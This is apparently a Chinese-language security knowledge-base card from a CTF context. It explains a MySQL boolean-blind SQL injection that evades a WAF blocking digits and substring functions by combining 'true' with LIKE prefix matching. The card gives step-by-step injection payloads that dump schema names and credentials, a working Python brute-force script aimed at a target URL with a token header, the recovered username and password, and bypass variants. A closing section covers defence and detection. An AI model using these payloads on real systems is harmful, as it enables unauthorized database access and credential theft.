---
id: web-generic-sqli-true-and-like-prefix-blind-no-digits
title: 禁数字与截取函数的布尔盲注：true and (子查询) like 'prefix%' 逐字符提取
type: scenario
domain: web
path: web/generic/sqli
technique: true-and-like-prefix-blind-sqli-no-digits
tags:
- sqli
- boolean-blind
- like
- waf-bypass
- no-digits
- group-concat
- mysql
- ctf
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V113
  verified_at: '2026-11-06T02:00:13+08:00'
  notes: 已对照原文七人组档案段核对：过滤所有数字与ascii/截取函数、true代替1、LIKE前缀逐字符、EXISTS/GROUP_CONCAT爆库表列数据、脚本字符集不含数字的踩坑均一致。未验证点：PoC未本机复跑；原文脚本未带X-Vought-Token头，卡片补上该必要头；frontmatter无sources/source_url。
url: /docs/web/generic/sqli/web-generic-sqli-true-and-like-prefix-blind-no-digits/
draft: false
kb_aliases:
- true 代替数字
- LIKE 前缀盲注
- 禁数字 SQL 注入
- 无 ascii/substr 盲注
- GROUP_CONCAT LIKE 爆破
- Vought 内部系统
---

## 一句话结论

当注入点过滤所有数字与 `ascii/substr` 等截取函数、但仍把输入拼进 SQL 时，可以用布尔字面量 `true` 代替 `1`，用 `(子查询) LIKE '已猜前缀%'` 作为布尔 oracle，逐字符爆破库名/表名/列名/数据；不需要任何数字或截取函数，`true and ... like 'a%'` 为真时页面正常、为假时 404，即可区分。

## 原理

- **`true` 是合法布尔字面量**：MySQL 中 `true` 等价于 `1`，但字符串里不出现数字；`true and <condition>` 等价于 `1 and <condition>`，可作为注入前缀。
- **LIKE 前缀匹配代替截取**：传统盲注用 `ascii(substr((select ...),i,1))>n`，需要数字和 `ascii/substr`；改用 `(select ...) LIKE 'prefix%'`，只判断“目标字符串是否以已猜前缀开头”，每轮追加一个字符，即可逐字符还原，不需要截取函数。
- **EXISTS/子查询**：库名/表名/列名可以通过 `information_schema` 查询；例如 `true AND EXISTS(SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA LIKE 'db' AND TABLE_NAME LIKE 'pre%')`，用 `LIKE` 同时约束 schema/table 前缀。
- **GROUP_CONCAT 一次拿多行**：`(SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE ...) LIKE 'prefix%'` 可把多列名拼成一个字符串逐字符爆破；`GROUP_CONCAT(member,keyword)` 可把账号和密码拼在一起。
- **oracle 判定**：条件为真时页面正常（空白/200），为假时返回 404/错误；脚本用 `'404' not in response.text` 判断命中。
- **踩坑（数字字符集）**：如果爆破字符集包含数字，而 WAF 对数字直接拦截，被拦截的请求也会返回非 404，导致误判为命中，结果开头多出 `0` 且后续全错；应只使用字母、`_`、`,` 等不会被 WAF 拦截的字符，或先单独处理数字。
- **拆账号密码**：`GROUP_CONCAT(member,keyword)` 无分隔符时得到 `stanedgarzpexnlot`，需要结合列名/格式拆分（账号 `stanedgar`、密码 `zpexnlot`），或分别对 `member`、`keyword` 列爆破。

## 触发条件

- 注入点把用户输入拼进 SQL，且错误/空结果可区分（404 vs 正常、true vs false）。
- WAF 过滤数字、`ascii`、`substr`、`mid`、`left`、`right` 等截取函数，但放行 `true`、`LIKE`、`AND`、子查询、`information_schema`。
- 数据库为 MySQL/MariaDB（`true`、`LIKE`、`information_schema`、`GROUP_CONCAT` 可用）。
- 攻击者能控制字符集并观察响应差异；可接受逐字符请求量。

## 利用步骤

1. 确认注入：输入 `true` 返回正常、`false` 返回异常/404；输入数字被 WAF 拦截。
2. 爆库名：`true and (select database()) like '{prefix+j}%'`，逐字符追加，直到得到 `vought`。
3. 爆表名：`true AND EXISTS(SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA LIKE 'vought' AND TABLE_NAME LIKE '{prefix+j}%')`，得到 `members`。
4. 爆列名：`true AND (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_SCHEMA LIKE 'vought' AND TABLE_NAME LIKE 'members')LIKE '{prefix+j}%'`，得到 `id,member,keyword`。
5. 爆数据：`true AND (SELECT GROUP_CONCAT(member,keyword) FROM members)LIKE '{prefix+j}%'`，得到 `homelanderqgxmyznp,queenmaeveftrhwjkc,...`。
6. 按列/格式拆分账号密码，登录后台继续利用。

## PoC

```python
import requests, string

url = "http://<target>/level1/Vought_Internal_system1917.php?id="
headers = {"X-Vought-Token": "Homelander"}
result = ""

for i in range(1, 100):
    for j in string.ascii_letters + "_" + ",":   # 不要加数字，避免 WAF 拦截造成假阳性
        payload = f"true and (select database()) like '{result + j}%'"
        r = requests.get(url + payload, headers=headers)
        if "404" not in r.text:
            result += j
            print(result)
            break
```

表名/列名/数据把 `(select database())` 换成对应的 `EXISTS(...)` 或 `GROUP_CONCAT(...)` 子查询即可。原文实测得到库 `vought`、表 `members`、列 `id,member,keyword`、账号 `stanedgar`/密码 `zpexnlot`；未在本库复跑。

## 变体与关联

- **布尔 oracle 变体**：`true`/`false`、`1=1`/`1=2`（若数字未被禁）、`AND`/`OR`、`EXISTS`、`IF()`、时间盲注（`SLEEP` 被禁时用重查询）。
- **匹配变体**：`LIKE 'prefix%'`、`REGEXP '^prefix'`、`LEFT(col,n)='prefix'`（若函数可用）、`INSTR`、`LOCATE`。
- **编码变体**：数字用 `true`/`false`、`length()` 用 `LENGTH(col) LIKE ...`、字符用十六进制 `0x...`（若 WAF 只禁十进制）。
- **关联卡片**：[[web-generic-sqli-like-clause-append-search]]（LIKE 拼接注入点）、[[web-generic-sqli-exists-left-boolean-oracle]]（EXISTS 布尔 oracle）、[[web-generic-sqli-cartesian-product-time-blind]]（时间盲注）。

## 检测与防御

- **参数化查询**：所有用户输入使用预编译参数，禁止拼接 SQL；`LIKE` 的值也要参数化。
- **WAF 不是边界**：只禁数字/函数不能阻止布尔盲注；应结合语义分析、速率限制、响应差异监控。
- **最小权限**：数据库账号只授予业务所需权限，禁止读 `information_schema` 之外的库/表；避免使用高权账号。
- **检测**：同一参数短时间内大量 `LIKE '...%'` 请求、字符集高度集中、404/200 比例异常；请求中出现 `true`、`information_schema`、`GROUP_CONCAT`、`LIKE` 等特征。
